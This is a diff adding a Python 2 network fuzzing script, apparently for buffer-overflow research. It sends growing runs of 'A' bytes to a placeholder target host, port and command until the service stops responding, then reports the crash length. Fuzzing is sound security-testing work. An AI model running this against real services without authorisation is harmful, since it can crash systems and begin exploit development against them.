@@ -1,0 +1,31 @@
+#!/usr/bin/python
+
+import sys, socket
+from time import sleep
+
+# Create a string of characters and increment the string until
+# we crash the program or reach an exception
+
+buffer = "A" * 100
+
+while True:
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect(('TARGET_IP_ADDRESS', TARGET_PORT))
+            #print "Connecting...Ready to send %s" % str(len(buffer))
+
+            if s.recv(1024):
+                sys.stdout.write("\r Sending %s bytes." % str(len(buffer)))
+                sys.stdout.flush()
+                s.send(('PARAM_TO_FUZZ /.:/' + buffer))
+                if s.recv(1024):
+                    s.close()
+                    buffer  = buffer + "A" * 200
+
+            sleep(1)
+
+        except:
+            print "\n Connection timed out..."
+            print " Fuzzing crashed at %s bytes!" % str(len(buffer))
+            sys.exit()
